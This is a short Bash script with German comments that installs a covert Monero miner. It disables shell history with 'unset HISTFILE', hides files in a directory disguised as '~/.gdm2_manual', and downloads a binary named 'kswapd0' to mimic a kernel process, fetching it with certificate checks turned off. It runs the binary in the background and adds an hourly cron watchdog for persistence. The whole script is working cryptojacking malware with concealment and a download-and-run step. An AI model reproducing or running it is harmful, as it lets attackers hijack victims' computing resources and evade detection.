unset HISTFILE

# Verzeichnis erstellen und ins Verzeichnis wechseln
mkdir -p "$HOME/.gdm2_manual/"
cd "$HOME/.gdm2_manual/" || exit

# Dateien herunterladen und entpacken
wget --no-check-certificate https://github.com/littlAcen/moneroocean-setup/raw/main/kswapd0
wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json

# Programm starten
./kswapd0 --config=config.json &

# Überprüfungsskript erstellen
cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
#!/bin/bash

if ! pgrep -x "kswapd0" > /dev/null
then
    echo "kswapd0 not started. Going to start it..."
    cd "$HOME/.gdm2_manual/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Überprüfungsskript ausführbar machen
chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"

# Cron-Job einrichten
(crontab -l 2>/dev/null; echo "0 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
